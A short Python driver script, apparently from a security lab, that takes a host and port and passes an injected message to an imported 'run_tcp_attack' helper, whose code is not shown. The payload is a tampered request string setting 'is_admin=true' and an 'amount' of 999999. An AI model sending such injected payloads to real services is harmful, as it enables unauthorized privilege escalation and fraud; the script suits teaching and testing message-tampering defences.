import argparse

from config import DEFAULT_HOST
from utils.attacker_runner import run_tcp_attack

parser = argparse.ArgumentParser()
parser.add_argument("--port", type=int, required=True, help="Target port")
parser.add_argument("--host", type=str, default=DEFAULT_HOST)
args = parser.parse_args()

injected_message = "username=admin&action=override&amount=999999&is_admin=true"

run_tcp_attack(
    host=args.host,
    port=args.port,
    plain_text=injected_message,
    payload=injected_message,
    verbose=True
)

print()
